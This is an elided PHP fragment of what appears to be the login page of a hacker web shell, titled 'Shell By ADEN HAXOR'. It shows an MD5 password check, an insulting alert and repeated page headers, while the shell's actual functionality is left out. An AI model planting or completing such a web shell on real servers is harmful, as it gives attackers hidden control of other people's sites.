...
if (isset($_POST['password'])) {
    ...
    if (md5($entered_password) === $hashed_password) {
        ...
        echo "<script>alert('TOLOL LU BANGSAT');</script>";
    }
}
if (!is_logged_in()) {
?>
...
<body>
    <form method="POST" action="">
    	<h1><i class="fas fa-folder-open"></i> Shell By ADEN HAXOR</h1>
    <br>
...
<body>
    ...
    <h1><i class="fas fa-folder-open"></i> SHELL ADEN H4XOR</h1>
    <br>
